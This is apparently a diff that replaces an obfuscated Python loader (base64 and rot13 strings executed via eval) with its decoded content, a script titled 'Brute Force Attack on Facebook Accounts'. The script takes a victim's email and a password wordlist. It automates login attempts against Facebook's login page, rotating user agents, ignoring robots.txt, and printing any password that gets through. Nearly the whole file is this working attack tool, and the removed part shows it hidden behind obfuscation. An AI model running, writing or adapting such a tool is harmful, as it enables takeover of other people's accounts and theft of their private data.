@@ -1,8 +1,66 @@
-import base64, codecs
-magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCiMgLSotIGNvZGluZzogVVRGLTggLSotCgkKCQppbXBvcnQgb3Msc3lzLG1lY2hhbml6ZSxjb29raWVsaWIscmFuZG9tLHRpbWUKCnByaW50ICIiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIApcMDMzWzA7MzRt4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKVlyAgICAg4paI4paI4pWXICAg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVkSAgICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWdICAgIOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlwrilojilojilojilojilojilojilZTilZ3ilojilojilZEgICAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRICAgICDilojilojilojilojilojilZcgICAgICDilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnQpcMDMzWzA7MW3ilojilojilZTilZDilZDilojilojilZfilojilojilZEgICAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gICAgICDilojilojilZ'
-love = 'GvyMQvyMQvyM0tVBXJvBXJvBXIyBXIxBXIxBXJvBXJvBXIyjevybwvybwvybwvybwvybwvybwvyMGvyM3vybwvybwvybwvybwvybwvybwvybwvyMsvyMevybwvybwvybwvybwvybwvybwvyMGvyM3vybwvybwvyMRtVPNtVBXIzhXJvBXJvBXJvBXJvBXJvBXJvBXIyBXIarXJvBXJvBXIxFNt4cnV4cnV4cJE4cJn4cnV4cnV4cnV4cnV4cnV4cnV4cJK4cnV4cnV4cnV4cnV4cnV4cnV4cnV4cJKVPNtVBXJvBXJvBXIxFNtVPNt4cnV4cnV4cnV4cnV4cnV4cnV4cJH4cJqPhXIzhXIxBXIxBXIxBXIxBXIxBXIaFQvyMevyMQvyMQvyMQvyMQvyMQvyMQvyM0t4cJn4cJD4cJD4cJD4cJD4cJD4cJqVBXIzhXIxBXIaFNtVPNtVBXIzhXIxBXIxBXIxBXIxBXIxBXIaFQvyMevyMQvyM0tVBXIzhXIxBXIaFQvyMevyMQvyMQvyMQvyMQvyMQvyM3vyMevyMQvyMQvyMQvyMQvyMQvyMQvyM0tVPNt4cJn4cJD4cJqVPNtVPQvyMevyMQvyMQvyMQvyMQvyMQvyM0tIwVhZPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPvNtVPNtVPNtVPNtVPNtVSjjZmAoZQfmAT0tVPNtVPNtVRWlqKEyVRMipzAyVRS0qTSwnlOiovOTLJAyLz9inlOOL2AiqJ50plOpZQZmJmN7ZJ0tsPOOozqyoSAyL3IlnKE5ITIuoIjjZmAoZQfkoFO8VPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNXVvVvVPNXMJ1unJjtCFOlLKqsnJ5jqKDbVxIgLJyfVQbtVvxXMTywVQ0tpzS3K2yhpUI0XPWpoyqipzEfnKA0VQbtVvxXoT9anJ4tCFNanUE0pUZ6Yl93q3phMzSwMJWio2fhL29gY2kiM2yhYaObpQ9fo2qcoy9uqUEyoKO0CGRaPaImMKWuM2IhqUZtCFOoXPqAo3ccoTkuYmHhZPNbJQRkBlOZ'
-god = 'aW51eCBpNjg2OyBydjo2NC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzY0LjAnLCJNb3ppbGxhLzUuMCAoWDExOyBMaW51eCBpNTg2OyBydjo2My4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzYzLjAiLCIgICAgTW96aWxsYS81LjAgKE1hY2ludG9zaDsgVTsgSW50ZWwgTWFjIE9TIFggMTAuMTA7IHJ2OjYyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjIuMCIsIiAgICBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBVOyBJbnRlbCBNYWMgT1MgWCAxMC4xMzsga287IHJ2OjEuOS4xYjIpIEdlY2tvLzIwMDgxMjAxIEZpcmVmb3gvNjAuMCIsIk1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIEZpcmVmb3gvNTguMC4xIiwiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NTQuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC81OC4wIiwiTW96aWxsYS81LjAgKFgxMTsgVTsgTGludXggaTY4NjsgZW4tVVM7IHJ2OjEuOWExKSBHZWNrby8yMDA2MDgxNCBGaXJlZm94LzUxLjAiLCIiKV0KCmRlZiBtYWluKCk6CiAgICAgICAgZ2xvYmFsIGJyCiAgICAgICAgYnIgPSBtZWNoYW5pemUuQnJvd3NlcigpCiAgICAgICAgY2ogPSBjb29raWVsaWIuTFdQQ29va2llSmFyKCkKICAgICAgICBici5zZXRfaGFuZGxlX3JvYm90cyhGYWxzZSkKICAgICAgICBici5zZXRfaGFuZGxlX3JlZGlyZWN0KFRydWUpCiAgICAgICAgYnIuc2V0X2Nvb2tpZWphcihjaikKICAgICAgICBici5zZXRfaGFuZGxlX2VxdWl2KFRydWUpCiAgICAgICAgYnIuc2V0X2hhbmRsZV9yZWZlcmVyKFRydWUpCiAgICAgICAgYnIuc2V0X2hhbmRsZV9yZWZyZXNoKG1lY2hhbml6ZS5faHR0cC5IVFRQUmVmcmVzaFByb2Nlc3NvcigpLCBtYXhfdGltZT0xKQogICAgICAgIGluaWNpbygpCiAgICAgICAgaW5pY2lvMigpCiAgICAgICAgcHJpbnQoIlxuUG9zc2libGUgUGFzc3dvcmQgRm'
-destiny = '91ozDtBvOpZQZmJmZ0oFO7sFVhMz9loJS0XUOup3A3o3WxXFxXVPNtVPNtVPOjpzyhqPtvKT5pZQZmJmN7ZJ1DLKAmq29lMPOBo3DtEz91ozDvXDbtVPNtVPNtVUEcoJHhp2kyMKNbZFxXVPNtVPNtVPNXPvNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNcxMJLtLaImL2SlXUOup3A3o3WxXGbXPFNtVPNXVPNtVPNtVPNXVPNtVPNtVPOjpzyhqPtvKT50MKA0nJ5aVUOup3A3o3WxVP0tr30vYzMipz1uqPujLKAmq29lMPxcPvNtVPNtVPNtLaVhLJExnTIuMTIlplN9VSfbW1ImMKVgLJqyoaDaYPOlLJ5xo20hL2uinJAyXUImMKWuM2IhqUZcXI0XVPNtVPNtVPOmnKEyVQ0tLaVho3Oyovufo2qcovxXVPNtVPNtVPOvpv5mMJkyL3EsMz9loFuhpvN9VQNcPvNtVPNtVPNtLaVhMz9loIfaMJ1unJjaKFN9VTIgLJyfPvNtVPNtVPNtLaVhMz9loIfapTSmplqqVQ0tpTSmp3qipzDXVPNtVPNtVPOmqJVtCFOvpv5mqJWgnKDbXDbtVPNtVPNtVTkiMlN9VUA1Lv5aMKE1pzjbXDbtVPNtVPNtVTyzVTkiMlNuCFOfo2qcovOuozDtXT5iqPNaoT9anJ5sLKE0MJ1jqPptnJ4toT9aXGbXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtpUWcoaDbVykhHTSmp3qipzDtEz91ozDtByjjZmAoZmEgVUg9Vv5zo3WgLKDbpTSmp3qipzDcXFNXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtp3ymYzI4nKDbZFxXVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtPzEyMvOcozywnJ8lXPx6PvNtVPNtVPNtM2kiLzSfVUOup3A3o3WxPvNtVPNtVPNtpTSmp3qipzDlVQ0to3OyovuxnJZfVaVvXDbtVPNtVPNtVTMipvOjLKAmq29lMPOcovOjLKAmq29lMQV6PvNtVPNtVPNtVPNtVPNtVPOjLKAmq29lMQVtCFOjLKAmq29lMP5lMKOfLJAyXPWpovVfVvVcPvNtVPNtVPNtVPNtVPNtVPOvqKAwLKVbpTSmp3qipzDcPzEyMvOcozywnJ8bXGbXPvNtVPNtVPNtMTywZvN9VT9jMJ4bMTywYPWlVvxXVPNtVPNtVPOxnJZlVQ0tMTywZv5lMJSxoTyhMKZbXDccMvOsK25uoJIsKlN9CFNaK19gLJyhK18aBtbtoJScovtcPt=='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+	
+	
+import os,sys,mechanize,cookielib,random,time
+
+print """
+                                
+\033[0;34m██████╗ ██╗     ██╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗    ███████╗██████╗ 
+██╔══██╗██║     ██║   ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔══██╗
+██████╔╝██║     ██║   ██║█████╗  ██║   ██║██████╔╝██║     █████╗      █████╗  ██████╔╝
+\033[0;1m██╔══██╗██║     ██║   ██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝      ██╔══╝  ██╔══██╗
+██████╔╝███████╗╚██████╔╝██║     ╚██████╔╝██║  ██║╚██████╗███████╗    ██║     ██████╔╝
+╚═════╝ ╚══════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚═╝     ╚═════╝ V2.0                                                                             
+               \033[0;34m        Brute Force Attack on Facebook Accounts \033[0;1m | AngelSecurityTeam\033[0;1m |                                                                                                                                                              
+"""  
+email = raw_input("Email : ")
+dic = raw_input("\nWordlist : ")
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+useragents = [('Mozilla/5.0 (X11; Linux i686; rv:64.0) Gecko/20100101 Firefox/64.0',"Mozilla/5.0 (X11; Linux i586; rv:63.0) Gecko/20100101 Firefox/63.0","    Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.10; rv:62.0) Gecko/20100101 Firefox/62.0","    Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.13; ko; rv:1.9.1b2) Gecko/20081201 Firefox/60.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/58.0.1","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/58.0","Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a1) Gecko/20060814 Firefox/51.0","")]
+
+def main():
+        global br
+        br = mechanize.Browser()
+        cj = cookielib.LWPCookieJar()
+        br.set_handle_robots(False)
+        br.set_handle_redirect(True)
+        br.set_cookiejar(cj)
+        br.set_handle_equiv(True)
+        br.set_handle_referer(True)
+        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+        inicio()
+        inicio2()
+        print("\nPossible Password Found : \033[34m {}".format(password))
+        print("\n\033[0;1mPassword Not Found")
+        time.sleep(1)
+        
+
+                        
+def buscar(password):
+	    
+        
+        print("\ntesting password - {}".format(password))
+        br.addheaders = [('User-agent', random.choice(useragents))]
+        site = br.open(login)
+        br.select_form(nr = 0)
+        br.form['email'] = email
+        br.form['pass'] = password
+        sub = br.submit()
+        log = sub.geturl()
+        if log != login and (not 'login_attempt' in log):
+                        print("\nPassword Found :\033[34m {}".format(password)) 
+                        sys.exit(1)
+                        
+def inicio2():
+        global password
+        password2 = open(dic,"r")
+        for password in password2:
+                password2 = password.replace("\n","")
+                buscar(password)
+def inicio():
+
+        dic2 = open(dic,"r")
+        dic2 = dic2.readlines()
+if __name__ == '__main__':
+ main()
